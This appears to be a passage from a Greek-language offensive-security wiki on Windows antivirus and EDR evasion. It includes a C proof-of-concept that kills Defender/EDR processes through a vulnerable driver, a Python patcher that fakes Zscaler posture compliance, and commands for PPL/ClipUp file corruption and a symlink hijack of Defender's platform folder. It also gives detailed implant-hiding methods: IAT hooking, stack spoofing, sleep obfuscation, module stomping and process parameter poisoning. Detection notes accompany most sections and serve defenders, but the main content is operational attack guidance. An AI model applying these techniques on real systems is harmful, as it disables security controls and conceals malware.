| Κωδικός IOCTL | Δυνατότητα                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Τερματισμός αυθαίρετης διεργασίας μέσω PID (χρησιμοποιείται για τον τερματισμό υπηρεσιών Defender/EDR) |
| `0x990000D0` | Διαγραφή αυθαίρετου αρχείου από τον δίσκο |
| `0x990001D0` | Unload του driver και αφαίρεση του service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Γιατί λειτουργεί**: Το BYOVD παρακάμπτει πλήρως τις user-mode protections· ο κώδικας που εκτελείται στο kernel μπορεί να ανοίξει *protected* processes, να τις τερματίσει ή να τροποποιήσει kernel objects, ανεξάρτητα από τα PPL/PP, ELAM ή άλλα hardening features.

Ανίχνευση / Μετριασμός
•  Ενεργοποιήστε τη vulnerable-driver block list της Microsoft (`HVCI`, `Smart App Control`), ώστε τα Windows να αρνούνται τη φόρτωση του `AToolsKrnl64.sys`.
•  Παρακολουθείτε τη δημιουργία νέων *kernel* services και δημιουργήστε alert όταν ένας driver φορτώνεται από world-writable directory ή δεν υπάρχει στη allow-list.
•  Αναζητάτε user-mode handles προς custom device objects, τα οποία ακολουθούνται από ύποπτες κλήσεις `DeviceIoControl`.

### Παράκαμψη των Posture Checks του Zscaler Client Connector μέσω On-Disk Binary Patching

Το **Client Connector** της Zscaler εφαρμόζει τοπικά κανόνες device-posture και βασίζεται στα Windows RPC για την επικοινωνία των αποτελεσμάτων σε άλλα components. Δύο αδύναμες σχεδιαστικές επιλογές καθιστούν δυνατή την πλήρη παράκαμψη:

1. Η αξιολόγηση του posture πραγματοποιείται **εξ ολοκλήρου στην πλευρά του client** (ένας boolean αποστέλλεται στον server).
2. Τα εσωτερικά RPC endpoints επικυρώνουν μόνο ότι το executable που συνδέεται είναι **υπογεγραμμένο από τη Zscaler** (μέσω `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Με το **patching τεσσάρων signed binaries στον δίσκο**, και οι δύο μηχανισμοί μπορούν να εξουδετερωθούν:

| Binary | Original logic patched | Αποτέλεσμα |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Επιστρέφει πάντα `1`, ώστε κάθε check να θεωρείται compliant |
| `ZSAService.exe` | Indirect call στο `WinVerifyTrust` | NOP-ed ⇒ οποιαδήποτε διεργασία, ακόμη και unsigned, μπορεί να συνδεθεί στα RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαθίσταται από `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks στο tunnel | Short-circuited |

Απόσπασμα από minimal patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση του service stack:

* **Όλοι** οι posture checks εμφανίζονται ως **green/compliant**.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ο compromised host αποκτά unrestricted access στο internal network που ορίζεται από τις Zscaler policies.

Αυτό το case study δείχνει πώς οι trust decisions που λαμβάνονται αποκλειστικά στην πλευρά του client και οι απλοί signature checks μπορούν να παρακαμφθούν με λίγα byte patches.

## Κατάχρηση του Protected Process Light (PPL) για Tampering σε AV/EDR με LOLBINs

Το Protected Process Light (PPL) επιβάλλει μια signer/level hierarchy, ώστε μόνο protected processes ίδιου ή υψηλότερου επιπέδου να μπορούν να κάνουν tampering μεταξύ τους. Επιθετικά, αν μπορείτε να εκκινήσετε νόμιμα ένα PPL-enabled binary και να ελέγξετε τα arguments του, μπορείτε να μετατρέψετε benign functionality (π.χ. logging) σε ένα constrained, PPL-backed write primitive εναντίον protected directories που χρησιμοποιούνται από AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Τι κάνει μια διεργασία να εκτελείται ως PPL
- Το target EXE (και οποιαδήποτε φορτωμένα DLLs) πρέπει να είναι signed με ένα PPL-capable EKU.
- Η διεργασία πρέπει να δημιουργηθεί με CreateProcess χρησιμοποιώντας τα flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί ένα συμβατό protection level που να ταιριάζει με τον signer του binary (π.χ. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για anti-malware signers, `PROTECTION_LEVEL_WINDOWS` για Windows signers). Λανθασμένα levels θα αποτύχουν κατά τη δημιουργία.

Δείτε επίσης μια ευρύτερη εισαγωγή στα PP/PPL και την προστασία του LSASS εδώ:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Εργαλεία εκκίνησης
- Open-source helper: CreateProcessAsPPL (επιλέγει το protection level και προωθεί τα arguments στο target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Μοτίβο χρήσης:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Το signed system binary `C:\Windows\System32\ClipUp.exe` εκκινεί τον εαυτό του και δέχεται μια παράμετρο για την εγγραφή ενός log file σε path που καθορίζει ο caller.
- Όταν εκκινείται ως PPL process, η εγγραφή του file πραγματοποιείται με PPL backing.
- Το ClipUp δεν μπορεί να αναλύσει paths που περιέχουν spaces· χρησιμοποιήστε 8.3 short paths για να δείξετε σε κανονικά προστατευμένες τοποθεσίες.

8.3 short path helpers
- Λίστα short names: `dir /x` σε κάθε parent directory.
- Εξαγωγή short path σε cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Εκκινήστε το PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας έναν launcher (π.χ. CreateProcessAsPPL).
2) Περάστε στο ClipUp το log-path argument για να εξαναγκάσετε τη δημιουργία ενός file σε protected AV directory (π.χ. Defender Platform). Χρησιμοποιήστε 8.3 short names αν χρειάζεται.
3) Αν το target binary είναι κανονικά ανοιχτό/κλειδωμένο από το AV κατά την εκτέλεσή του (π.χ. MsMpEng.exe), προγραμματίστε την εγγραφή κατά το boot, πριν ξεκινήσει το AV, εγκαθιστώντας ένα auto-start service που εκτελείται αξιόπιστα νωρίτερα. Επικυρώστε τη σειρά εκκίνησης με το Process Monitor (boot logging).
4) Μετά το reboot, η PPL-backed εγγραφή πραγματοποιείται πριν το AV κλειδώσει τα binaries του, καταστρέφοντας το target file και αποτρέποντας την εκκίνηση.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Σημειώσεις και περιορισμοί
- Δεν μπορείτε να ελέγξετε τα περιεχόμενα που γράφει το ClipUp πέρα από την τοποθέτηση· το primitive είναι κατάλληλο για corruption και όχι για ακριβή εισαγωγή περιεχομένου.
- Απαιτούνται local admin/SYSTEM για την εγκατάσταση/εκκίνηση μιας υπηρεσίας και ένα παράθυρο επανεκκίνησης.
- Ο συγχρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά την εκκίνηση αποφεύγει τα file locks.

Ανιχνεύσεις
- Δημιουργία διεργασίας του `ClipUp.exe` με ασυνήθιστα ορίσματα, ειδικά όταν έχει ως parent μη τυπικούς launchers, κοντά στην εκκίνηση.
- Νέες υπηρεσίες ρυθμισμένες για auto-start ύποπτων binaries, οι οποίες ξεκινούν σταθερά πριν από το Defender/AV. Ερευνήστε τη δημιουργία/τροποποίηση υπηρεσιών πριν από αποτυχίες εκκίνησης του Defender.
- Παρακολούθηση ακεραιότητας αρχείων για τα binaries/Platform directories του Defender· απρόσμενες δημιουργίες/τροποποιήσεις αρχείων από διεργασίες με protected-process flags.
- Τηλεμετρία ETW/EDR: αναζητήστε διεργασίες που δημιουργούνται με `CREATE_PROTECTED_PROCESS` και ανώμαλη χρήση επιπέδων PPL από non-AV binaries.

Μετριασμοί
- WDAC/Code Integrity: περιορίστε ποια signed binaries μπορούν να εκτελούνται ως PPL και από ποιους parents· αποκλείστε την invocation του ClipUp εκτός νόμιμων contexts.
- Service hygiene: περιορίστε τη δημιουργία/τροποποίηση auto-start υπηρεσιών και παρακολουθείτε τη χειραγώγηση της σειράς εκκίνησης.
- Βεβαιωθείτε ότι είναι ενεργοποιημένα τα Defender tamper protection και early-launch protections· διερευνήστε σφάλματα εκκίνησης που υποδεικνύουν corruption binary.
- Εξετάστε την απενεργοποίηση της δημιουργίας short names 8.3 σε volumes που φιλοξενούν security tooling, εφόσον είναι συμβατό με το περιβάλλον σας (δοκιμάστε διεξοδικά).

## Tampering Microsoft Defender μέσω Symlink Hijack του Platform Version Folder

Το Windows Defender επιλέγει την platform από την οποία εκτελείται, απαριθμώντας τους υποφακέλους κάτω από:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Επιλέγει τον υποφάκελο με το υψηλότερο lexicographic version string (π.χ. `4.18.25070.5-0`) και, στη συνέχεια, εκκινεί από εκεί τις διεργασίες της υπηρεσίας Defender (ενημερώνοντας ανάλογα τα service/registry paths). Αυτή η επιλογή εμπιστεύεται τα directory entries, συμπεριλαμβανομένων των directory reparse points (symlinks). Ένας administrator μπορεί να το εκμεταλλευτεί για να ανακατευθύνει το Defender σε attacker-writable path και να επιτύχει DLL sideloading ή διακοπή της υπηρεσίας.<sup>[[21]](#references)[[22]](#references)</sup>

Προαπαιτούμενα
- Local Administrator (απαιτείται για τη δημιουργία directories/symlinks κάτω από τον Platform folder)
- Δυνατότητα reboot ή trigger του Defender platform re-selection (service restart κατά την εκκίνηση)
- Απαιτούνται μόνο built-in tools (`mklink`)

Γιατί λειτουργεί
- Το Defender αποκλείει τις εγγραφές στους δικούς του φακέλους, όμως η επιλογή της platform εμπιστεύεται τα directory entries και επιλέγει την υψηλότερη lexicographic version χωρίς να επικυρώνει ότι ο στόχος επιλύεται σε protected/trusted path.

Βήμα-βήμα (παράδειγμα)
1) Προετοιμάστε έναν writable clone του τρέχοντος platform folder, π.χ. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Δημιουργήστε ένα symlink καταλόγου υψηλότερης έκδοσης μέσα στο Platform που να δείχνει στον φάκελό σας:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Επιλογή trigger (συνιστάται επανεκκίνηση):
```cmd
shutdown /r /t 0
```
4) Επαληθεύστε ότι το MsMpEng.exe (WinDefend) εκτελείται από την ανακατευθυνόμενη διαδρομή:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Θα πρέπει να παρατηρήσετε τη νέα διαδρομή της διεργασίας κάτω από το `C:\TMP\AV\` και τη ρύθμιση παραμέτρων της υπηρεσίας/το registry να αντικατοπτρίζει αυτήν την τοποθεσία.

Post-exploitation options
- DLL sideloading/code execution: Τοποθετήστε/αντικαταστήστε DLLs που το Defender φορτώνει από τον κατάλογο της εφαρμογής του, ώστε να εκτελέσετε κώδικα στις διεργασίες του Defender. Δείτε την παραπάνω ενότητα: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Τερματισμός/άρνηση υπηρεσίας: Αφαιρέστε το version-symlink, ώστε στην επόμενη εκκίνηση η ρυθμισμένη διαδρομή να μην επιλύεται και το Defender να αποτυγχάνει να ξεκινήσει:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Σημειώστε ότι αυτή η τεχνική δεν παρέχει privilege escalation από μόνη της· απαιτεί δικαιώματα διαχειριστή.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Οι Red teams μπορούν να μεταφέρουν το runtime evasion από το C2 implant στο ίδιο το target module, κάνοντας hooking στο Import Address Table (IAT) και δρομολογώντας επιλεγμένα APIs μέσω attacker-controlled, position‑independent code (PIC). Αυτό γενικεύει το evasion πέρα από το μικρό API surface που εκθέτουν πολλά kits (π.χ. CreateProcessA) και επεκτείνει τις ίδιες προστασίες σε BOFs και post‑exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Προσέγγιση υψηλού επιπέδου
- Κάντε stage ένα PIC blob δίπλα στο target module χρησιμοποιώντας reflective loader (prepended ή companion). Το PIC πρέπει να είναι self‑contained και position‑independent.
- Καθώς φορτώνεται το host DLL, διατρέξτε το IMAGE_IMPORT_DESCRIPTOR και κάντε patch τις IAT entries για τα targeted imports (π.χ. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), ώστε να δείχνουν σε thin PIC wrappers.
- Κάθε PIC wrapper εκτελεί evasions πριν κάνει tail-call στη διεύθυνση του πραγματικού API. Τα τυπικά evasions περιλαμβάνουν:
- Memory mask/unmask γύρω από το call (π.χ. encrypt beacon regions, RWX→RX, αλλαγή page names/permissions) και έπειτα restore μετά το call.
- Call-stack spoofing: κατασκευή ενός benign stack και μετάβαση στο target API, ώστε το call-stack analysis να επιλύεται στα αναμενόμενα frames.<sup>[[9]](#references)</sup>
- Για compatibility, κάντε export ένα interface, ώστε ένα Aggressor script (ή equivalent) να μπορεί να καταχωρίζει ποια APIs θα γίνονται hook για Beacon, BOFs και post‑ex DLLs.

Γιατί IAT hooking εδώ
- Λειτουργεί για οποιονδήποτε κώδικα χρησιμοποιεί το hooked import, χωρίς τροποποίηση του tool code ή εξάρτηση από το Beacon για proxy συγκεκριμένων APIs.
- Καλύπτει post‑ex DLLs: το hooking των LoadLibrary* σάς επιτρέπει να κάνετε intercept τα module loads (π.χ. System.Management.Automation.dll, clr.dll) και να εφαρμόζετε το ίδιο masking/stack evasion στα API calls τους.
- Επαναφέρει την αξιόπιστη χρήση post‑ex commands που κάνουν process-spawning απέναντι σε detections που βασίζονται στο call-stack, κάνοντας wrapping τα CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Εφάρμοσε το patch μετά τις relocations/ASLR και πριν από την πρώτη χρήση του import. Reflective loaders όπως τα TitanLdr/AceLdr επιδεικνύουν hooking κατά τη διάρκεια του DllMain του loaded module.
- Κράτησε τα wrappers μικρά και PIC-safe· κάνε resolve το true API μέσω της αρχικής τιμής IAT που κατέγραψες πριν από το patching ή μέσω του LdrGetProcedureAddress.
- Χρησιμοποίησε μεταβάσεις RW → RX για το PIC και απόφυγε να αφήνεις σελίδες writable+executable.

Call‑stack spoofing stub
- Τα PIC stubs τύπου Draugr δημιουργούν μια fake call chain (return addresses μέσα σε benign modules) και στη συνέχεια κάνουν pivot στο real API.
- Αυτό παρακάμπτει detections που αναμένουν canonical stacks από Beacon/BOFs προς sensitive APIs.
- Συνδύασέ το με τεχνικές stack cutting/stack stitching, ώστε να καταλήγεις μέσα στα αναμενόμενα frames πριν από το API prologue.

Operational integration
- Πρόσθεσε τον reflective loader στην αρχή των post‑ex DLLs, ώστε τα PIC και hooks να αρχικοποιούνται αυτόματα όταν φορτώνεται το DLL.
- Χρησιμοποίησε ένα Aggressor script για να καταχωρίζεις τα target APIs, ώστε τα Beacon και BOFs να επωφελούνται διαφανώς από το ίδιο evasion path χωρίς αλλαγές στον κώδικα.

Detection/DFIR considerations
- IAT integrity: entries που κάνουν resolve σε non-image (heap/anon) addresses· periodic verification των import pointers.
- Stack anomalies: return addresses που δεν ανήκουν σε loaded images· απότομες μεταβάσεις σε non-image PIC· ασυνεπής RtlUserThreadStart ancestry.
- Loader telemetry: in-process writes στο IAT, early DllMain activity που τροποποιεί import thunks, απρόσμενες RX regions που δημιουργούνται κατά το load.
- Image-load evasion: αν γίνεται hooking στο LoadLibrary*, παρακολούθησε ύποπτα loads automation/clr assemblies που συσχετίζονται με memory masking events.

Related building blocks and examples
- Reflective loaders που πραγματοποιούν IAT patching κατά το load (π.χ. TitanLdr, AceLdr)
- Memory masking hooks (π.χ. simplehook) και stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (π.χ. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Αν ελέγχεις έναν reflective loader, μπορείς να κάνεις hook στα imports **κατά τη διάρκεια του** `ProcessImports()` αντικαθιστώντας τον pointer του loader's `GetProcAddress` με έναν custom resolver που ελέγχει πρώτα τα hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Δημιούργησε ένα **resident PICO** (persistent PIC object) που παραμένει ενεργό αφού το transient loader PIC απελευθερώσει τη μνήμη του.
- Κάνε export μια συνάρτηση `setup_hooks()` που κάνει overwrite τον import resolver του loader (π.χ. `funcs.GetProcAddress = _GetProcAddress`).
- Στο `_GetProcAddress`, παρέλειψε τα ordinal imports και χρησιμοποίησε ένα hash-based hook lookup όπως το `__resolve_hook(ror13hash(name))`. Αν υπάρχει hook, επέστρεψέ το· διαφορετικά, κάνε delegate στο real `GetProcAddress`.
- Καταχώρισε τα hook targets κατά το link time με entries Crystal Palace `addhook "MODULE$Func" "hook"`. Το hook παραμένει valid επειδή βρίσκεται μέσα στο resident PICO.

Αυτό παρέχει **import-time IAT redirection** χωρίς patching του code section του loaded DLL μετά το load.

### Forcing hookable imports when the target uses PEB-walking

Τα import-time hooks ενεργοποιούνται μόνο αν η συνάρτηση βρίσκεται πράγματι στο IAT του target. Αν ένα module κάνει resolve τα APIs μέσω PEB-walk + hash (χωρίς import entry), ανάγκασε ένα πραγματικό import ώστε το path του loader's `ProcessImports()` να το εντοπίσει:

- Αντικατάστησε το hashed export resolution (π.χ. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) με μια direct reference όπως `&WaitForSingleObject`.
- Ο compiler δημιουργεί ένα IAT entry, επιτρέποντας την interception όταν ο reflective loader κάνει resolve τα imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Αντί να κάνεις patch το `Sleep`, κάνε hook τα **actual wait/IPC primitives** που χρησιμοποιεί το implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Για long waits, τύλιξε το call σε μια Ekko-style obfuscation chain που κάνει encrypt το in-memory image κατά το idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Χρησιμοποίησε `CreateTimerQueueTimer` για να προγραμματίσεις μια ακολουθία callbacks που καλούν `NtContinue` με crafted `CONTEXT` frames.
- Typical chain (x64): κάνε set το image σε `PAGE_READWRITE` → RC4 encrypt μέσω του `advapi32!SystemFunction032` σε ολόκληρο το mapped image → εκτέλεσε το blocking wait → RC4 decrypt → **κάνε restore τα per-section permissions** κάνοντας walk στα PE sections → κάνε signal την ολοκλήρωση.
- Το `RtlCaptureContext` παρέχει ένα template `CONTEXT`· κάνε clone σε πολλαπλά frames και κάνε set τα registers (`Rip/Rcx/Rdx/R8/R9`) ώστε να γίνει invoke κάθε step.

Operational detail: επέστρεφε “success” για long waits (π.χ. `WAIT_OBJECT_0`), ώστε ο caller να συνεχίζει ενώ το image είναι masked. Αυτό το pattern κρύβει το module από scanners κατά τα idle windows και αποφεύγει το κλασικό signature του “patched `Sleep()`”.

Detection ideas (telemetry-based)
- Bursts από `CreateTimerQueueTimer` callbacks που δείχνουν στο `NtContinue`.
- Χρήση του `advapi32!SystemFunction032` σε large contiguous buffers μεγέθους image.
- Large-range `VirtualProtect` και στη συνέχεια custom per-section permission restoration.

### Runtime CFG registration for sleep-obfuscation gadgets

Σε CFG-enabled targets, το πρώτο indirect jump σε ένα mid-function gadget όπως `jmp [rbx]` ή `jmp rdi` συνήθως θα προκαλέσει crash στη process με `STATUS_STACK_BUFFER_OVERRUN`, επειδή το gadget δεν υπάρχει στα CFG metadata του module. Για να διατηρήσεις ενεργές τις Ekko/Kraken-style chains μέσα σε hardened processes:<sup>[[30]](#references)</sup>

- Καταχώρισε κάθε indirect destination που χρησιμοποιείται από την chain με `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` και entries `CFG_CALL_TARGET_VALID`.
- Για addresses μέσα σε loaded images (`ntdll`, `kernel32`, `advapi32`), το `MEMORY_RANGE_ENTRY` πρέπει να ξεκινά από το **image base** και να καλύπτει ολόκληρο το image size.
- Για manually mapped/PIC/stomped regions, χρησιμοποίησε το **allocation base** και το allocation size.
- Κάνε mark όχι μόνο το dispatch gadget, αλλά και τα exports που προσεγγίζονται indirectly (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), καθώς και οποιαδήποτε attacker-controlled executable sections που θα γίνουν indirect targets.

Αυτό μετατρέπει τις sleep chains τύπου ROP/JOP από primitive που “works only in non-CFG processes” σε reusable primitive για τα `explorer.exe`, browsers, `svchost.exe` και άλλα endpoints που έχουν γίνει compile με `/guard:cf`.

### CET-safe stack spoofing for sleeping threads

Η πλήρης αντικατάσταση του `CONTEXT` είναι noisy και μπορεί να αποτύχει σε συστήματα με CET Shadow Stack, επειδή ένα spoofed `Rip` πρέπει και πάλι να συμφωνεί με το hardware shadow stack. Ένα ασφαλέστερο sleep-masking pattern είναι το εξής:<sup>[[30]](#references)</sup>

- Επίλεξε ένα άλλο thread στην ίδια process και διάβασε τα stack bounds του `NT_TIB` / TEB (`StackBase`, `StackLimit`) μέσω του `NtQueryInformationThread`.
- Κάνε backup το πραγματικό TEB/TIB του current thread.
- Κάνε capture το real sleeping context με `GetThreadContext`.
- Αντέγραψε **μόνο** το πραγματικό `Rip` στο spoof context, αφήνοντας ανέπαφα τα spoofed `Rsp`/stack state.
- Κατά τη διάρκεια του sleep window, αντέγραψε το `NT_TIB` του spoof thread στο current TEB, ώστε οι stack walkers να κάνουν unwind μέσα σε legitimate stack range.
- Μετά την ολοκλήρωση του wait, κάνε restore το αρχικό TIB και το thread context.

Αυτό διατηρεί ένα CET-consistent instruction pointer, ενώ παραπλανά τους EDR stack walkers που εμπιστεύονται τα TEB stack metadata για την επικύρωση των unwinds.

### APC-based alternative: Kraken Mask

Αν το timer-queue dispatch έχει υπερβολικά πολλά signatures, η ίδια sleep-encrypt-spoof-restore sequence μπορεί να εκτελεστεί από ένα suspended helper thread χρησιμοποιώντας queued APCs:<sup>[[27]](#references)</sup>

- Δημιούργησε ένα helper thread με `NtTestAlert` ως entrypoint.
- Κάνε queue τα prepared `CONTEXT` frames/APCs με `NtQueueApcThread` και κάνε drain με `NtAlertResumeThread`.
- Αποθήκευσε το chain state στο heap αντί για το helper stack, ώστε να αποφύγεις την εξάντληση του default 64 KB thread stack.
- Χρησιμοποίησε `NtSignalAndWaitForSingleObject` για atomic signal του start event και block.
- Κάνε suspend το main thread πριν από το restore του TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), ώστε να μειώσεις το race window κατά το οποίο ένας scanner θα μπορούσε να εντοπίσει ένα half-restored stack.

Αυτό αντικαθιστά το `CreateTimerQueueTimer` + `NtContinue` signature με ένα helper-thread/APC signature, διατηρώντας παράλληλα τους ίδιους στόχους RC4 masking και stack-spoofing.

Additional detection ideas
- `NtSetInformationVirtualMemory` με `VmCfgCallTargetInformation` λίγο πριν από sleeps, waits ή APC dispatch.
- `GetThreadContext`/`SetThreadContext` σε συνδυασμό με `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ή `ConnectNamedPipe`.
- `NtQueryInformationThread` και στη συνέχεια direct writes στα TEB/TIB stack bounds του current thread.
- `NtQueueApcThread`/`NtAlertResumeThread` chains που φτάνουν indirectly στα `SystemFunction032`, `VirtualProtect` ή σε helpers αποκατάστασης section-permissions.
- Επαναλαμβανόμενη χρήση σύντομων gadget signatures όπως `FF 23` (`jmp [rbx]`) ή `FF E7` (`jmp rdi`) ως dispatch pivots μέσα σε signed modules.


## Precision Module Stomping

Το Module stomping εκτελεί payloads από το **`.text` section ενός DLL που είναι ήδη mapped μέσα στο target process**, αντί να κάνει allocate εμφανή private executable memory ή να φορτώνει ένα νέο sacrificial DLL. Ο overwrite target πρέπει να είναι ένα **loaded, disk-backed image** του οποίου ο code space μπορεί να απορροφήσει το payload χωρίς να καταστρέψει code paths που χρειάζεται ακόμη η process.<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

Το naive stomping σε common modules όπως τα `uxtheme.dll` ή `comctl32.dll` είναι fragile: το DLL μπορεί να μην έχει φορτωθεί στη remote process και μια πολύ μικρή code region θα προκαλέσει crash στη process. Ένα πιο reliable workflow είναι:

1. Κάνε enumerate τα target process modules και κράτησε ένα **names-only include list** των DLLs που είναι ήδη loaded.
2. Κάνε build πρώτα το payload και κατέγραψε το **exact byte size** του.
3. Κάνε scan τα candidate DLLs στον δίσκο και σύγκρινε το PE section **`.text` `Misc_VirtualSize`** με το payload size. Αυτό είναι σημαντικότερο από το file size, επειδή αντικατοπτρίζει το μέγεθος του executable section **όταν γίνεται map στη memory**.
4. Κάνε parse το **Export Address Table (EAT)** και επίλεξε ένα exported function RVA ως το stomp start offset.
5. Υπολόγισε το **blast radius**: αν το payload υπερβαίνει το selected function boundary, θα κάνει overwrite τα adjacent exports που είναι τοποθετημένα μετά από αυτό στη memory.

Typical recon/selection helpers που εμφανίζονται στη wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operational notes
- Προτίμησε DLLs που είναι **ήδη φορτωμένα** στο remote process, ώστε να αποφεύγεται η τηλεμετρία των `LoadLibrary`/μη αναμενόμενων image loads.
- Προτίμησε exports που εκτελούνται σπάνια από την target εφαρμογή, διαφορετικά οι κανονικές code paths ενδέχεται να εκτελέσουν τα stomped bytes πριν ή μετά τη δημιουργία του thread.
- Τα μεγάλα implants συχνά απαιτούν την αλλαγή του shellcode embedding από string literal σε **byte-array/braced initializer**, ώστε ολόκληρο το buffer να αναπαρίσταται σωστά στον injector source.

Detection ideas
- Remote writes σε **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) αντί για τις συνηθέστερες private RWX/RX allocations.
- Export entry points των οποίων τα in-memory bytes δεν αντιστοιχούν πλέον στο backing file στον δίσκο.
- Remote threads ή context pivots που ξεκινούν την εκτέλεση μέσα σε legitimate DLL export, του οποίου τα πρώτα bytes τροποποιήθηκαν πρόσφατα.
- Ύποπτες ακολουθίες `VirtualProtect(Ex)` / `WriteProcessMemory` σε DLL `.text` pages, οι οποίες ακολουθούνται από thread creation.

## Process Parameter Poisoning (P3)

Το Process Parameter Poisoning (P3) είναι μια τεχνική **process-injection / EDR-evasion** που αποφεύγει το κλασικό remote write path (`VirtualAllocEx` + `WriteProcessMemory`). Αντί να αντιγράφει bytes σε έναν ήδη εκτελούμενο target, εκμεταλλεύεται το γεγονός ότι τα Windows **αντιγράφουν επιλεγμένες παραμέτρους εκκίνησης της `CreateProcessW` στο child process** και τις αποθηκεύουν μέσα στο `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers copied by `CreateProcessW`

Χρήσιμα carriers είναι:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (με `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Practical carrier constraints:

- Το `lpCommandLine` πρέπει να δείχνει σε **writable memory** για την `CreateProcessW` και περιορίζεται σε **32.767 Unicode χαρακτήρες**, συμπεριλαμβανομένου του null terminator.
- Το `lpEnvironment` πρέπει να είναι ένα Unicode environment block από διαδοχικά strings `NAME=VALUE\0`, τα οποία τερματίζονται με ένα επιπλέον `\0`.
- Το `lpReserved` είναι επίσημα reserved, επομένως το mapping στο `ShellInfo` πρέπει να αντιμετωπίζεται ως implementation detail και όχι ως σταθερό documented contract.

